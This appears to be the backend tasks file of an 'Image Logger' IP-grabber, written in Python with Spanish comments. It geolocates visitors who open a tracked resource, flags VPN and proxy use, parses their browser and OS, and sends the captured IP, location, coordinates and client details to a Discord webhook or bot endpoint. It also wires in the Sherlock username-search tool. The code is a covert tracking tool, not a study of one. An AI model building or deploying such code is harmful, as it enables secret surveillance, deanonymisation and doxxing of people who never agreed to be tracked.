'tracker/tasks.py'
# Versión modificada para priorizar envío al bot (BOT_CALLBACK_URL) y fallback a webhook/disco.

import os
import re
import json
import requests
import subprocess
from datetime import datetime
from pathlib import Path

from user_agents import parse as ua_parse

from celery_app import celery

REPO_ROOT = os.environ.get('REPO_ROOT', '/opt/app')
SHERLOCK_DIR = os.environ.get('SHERLOCK_DIR', os.path.join(REPO_ROOT, '.tools', 'sherlock'))
OUT_DIR = os.path.join(REPO_ROOT, '.pages', 'sherlock')

DISCORD_WEBHOOK = os.environ.get('DISCORD_WEBHOOK')  # legacy webhook fallback
BOT_CALLBACK_URL = os.environ.get('BOT_CALLBACK_URL')  # e.g. http://bot:3000/api/event
BOT_CALLBACK_TOKEN = os.environ.get('BOT_CALLBACK_TOKEN')  # token the bot expects

IPINFO_TOKEN = os.environ.get('IPINFO_TOKEN')  # optional

os.makedirs(OUT_DIR, exist_ok=True)

RE_EMAIL = re.compile(r'[A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,}')
RE_PHONE = re.compile(r'(\+?\d{6,15}(?:[ \-\(\)]*\d{2,15})?)')
RE_URL = re.compile(r'https?://[^\s\'"<>]+')

def geoip_lookup(ip):
    try:
        if IPINFO_TOKEN:
            r = requests.get(f"https://ipinfo.io/{ip}/json?token={IPINFO_TOKEN}", timeout=6)
            if r.ok:
                j = r.json()
                latlon = j.get('loc','').split(',') if j.get('loc') else [None, None]
                return {
                    "ip": j.get('ip') or ip,
                    "provider": j.get('org'),
                    "asn": j.get('org'),
                    "country": j.get('country'),
                    "region": j.get('region'),
                    "city": j.get('city'),
                    "lat": latlon[0],
                    "lon": latlon[1] if len(latlon) > 1 else None,
                    "timezone": j.get('timezone'),
                    "raw": j
                }
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,message,country,regionName,city,lat,lon,isp,as,timezone,proxy,mobile,query,hosting", timeout=6)
        if r.ok:
            j = r.json()
            if j.get('status') == 'success':
                return {
                    "ip": j.get('query'),
                    "provider": j.get('isp'),
                    "asn": j.get('as'),
                    "country": j.get('country'),
                    "region": j.get('regionName'),
                    "city": j.get('city'),
                    "lat": j.get('lat'),
                    "lon": j.get('lon'),
                    "timezone": j.get('timezone'),
                    "mobile": j.get('mobile'),
                    "proxy": j.get('proxy'),
                    "raw": j,
                    "hosting": j.get('hosting') if 'hosting' in j else False
                }
            else:
                return {"ip": ip, "error": j.get('message')}
    except Exception as e:
        return {"ip": ip, "error": str(e)}
    return {"ip": ip, "error": "lookup_failed"}

def evaluate_vpn_proxy_simple(ip, geo):
    score = 0.0
    reasons = []
    is_vpn = False
    is_proxy = False

    if not geo:
        return {"is_vpn": False, "is_proxy": False, "score": 0.0, "reasons": []}

    if geo.get('proxy'):
        score = max(score, 0.7)
        is_proxy = True
        reasons.append('geo.proxy')

    if geo.get('mobile'):
        score = max(score, score, 0.2)
        reasons.append('geo.mobile')

    provider = (geo.get('provider') or '').lower() if geo.get('provider') else ''
    asn = (str(geo.get('asn') or '')).lower()
    suspicious = ['mullvad', 'nordvpn', 'expressvpn', 'surfshark', 'vpn', 'virtual', 'digitalocean', 'amazon', 'google cloud', 'hetzner', 'linode', 'ovh', 'cloudflare', 'aws']

    for s in suspicious:
        if s in provider or s in asn:
            score = max(score, 0.75)
            is_vpn = True
            is_proxy = True
            reasons.append(f'asn_provider:{s}')
            break

    score = min(score, 1.0)
    return {"is_vpn": is_vpn, "is_proxy": is_proxy, "score": score, "reasons": reasons}

def detect_ua_info(user_agent):
    ua = ua_parse(user_agent or "")
    browser = f"{ua.browser.family} {ua.browser.version_string}".strip()
    os_str = f"{ua.os.family} {ua.os.version_string}".strip()
    return {
        "is_mobile": ua.is_mobile,
        "is_bot": ua.is_bot,
        "browser": browser,
        "os": os_str,
        "ua_string": user_agent
    }

def _post_to_bot_callback(payload):
    if not BOT_CALLBACK_URL:
        return False, "no_callback_configured"
    try:
        headers = {'Content-Type': 'application/json'}
        if BOT_CALLBACK_TOKEN:
            headers['x-bot-token'] = BOT_CALLBACK_TOKEN
        resp = requests.post(BOT_CALLBACK_URL, json=payload, headers=headers, timeout=8)
        return (resp.ok, f"{resp.status_code}:{resp.text[:200]}")
    except Exception as e:
        return False, str(e)

def send_discord_embed(hit, geo, ua_info, vpninfo=None, original_url=None, thumbnail=None):
    title = "Image Logger — IP Captured"
    fields = []

    ip_info_value = f"**IP:** {geo.get('ip')}\n**Provider:** {geo.get('provider') or 'N/A'}\n**ASN:** {geo.get('asn') or 'N/A'}\n**Country:** {geo.get('country') or 'N/A'}\n**Region:** {geo.get('region') or 'N/A'}\n**City:** {geo.get('city') or 'N/A'}\n**Coords:** {geo.get('lat')},{geo.get('lon')}\n**Timezone:** {geo.get('timezone') or 'N/A'}"
    fields.append({"name": "IP Info", "value": ip_info_value, "inline": False})

    if vpninfo:
        vpn_val = f"Score: {vpninfo.get('score'):.2f} — VPN: {vpninfo.get('is_vpn')} — Proxy: {vpninfo.get('is_proxy')}\nReasons: {', '.join(vpninfo.get('reasons', []) or 'none')}"
        fields.append({"name": "VPN/Proxy check", "value": vpn_val, "inline": False})

    pc_info = f"**OS:** {ua_info.get('os')}\n**Browser:** {ua_info.get('browser')}\n**Mobile:** {ua_info.get('is_mobile')}\n**Bot:** {ua_info.get('is_bot')}"
    fields.append({"name": "Client", "value": pc_info, "inline": False})

    ua_block = ua_info.get('ua_string', '')[:1500] or ''
    fields.append({"name": "User Agent", "value": f"```{ua_block}```", "inline": False})

    description = f"Endpoint: {hit.get('endpoint')} — Captured: {hit.get('received_at')}\nResource: {hit.get('resource_name') or ''}\nOriginal: {original_url or ''}"

    embed = {
        "title": title,
        "description": description,
        "color": 0x2ECC71,
        "fields": fields,
        "timestamp": datetime.utcnow().isoformat()
    }

    payload = {"embed": embed, "meta": {"geo": geo, "vpn": vpninfo, "ua": ua_info, "hit": hit, "original_url": original_url}}

    # 1) Try bot callback
    ok, info = _post_to_bot_callback(payload)
    if ok:
        return

    # 2) Try legacy webhook fallback
    if DISCORD_WEBHOOK:
        try:
            webhook_payload = {"username": "Image-Logger", "embeds": [embed]}
            resp = requests.post(DISCORD_WEBHOOK, json=webhook_payload, timeout=8)
            if not resp.ok:
                stamp = int(datetime.utcnow().timestamp())
                p = Path(OUT_DIR) / f"embed_fail_{hit.get('ip','unknown')}_{stamp}.json"
                p.write_text(json.dumps({"status_code": resp.status_code, "resp_text": resp.text, "payload": webhook_payload}, indent=2, ensure_ascii=False))
        except Exception as e:
            stamp = int(datetime.utcnow().timestamp())
            p = Path(OUT_DIR) / f"embed_exc_{hit.get('ip','unknown')}_{stamp}.json"
            p.write_text(json.dumps({"error": str(e), "payload": payload}, indent=2, ensure_ascii=False))
        return

    # 3) Fallback: write to disk
    stamp = int(datetime.utcnow().timestamp())
    p = Path(OUT_DIR) / f"embed_{hit.get('ip','unknown')}_{stamp}.json"
    try:
        p.write_text(json.dumps(payload, indent=2, ensure_ascii=False))
    except Exception:
        print("Failed writing embed fallback file")
    return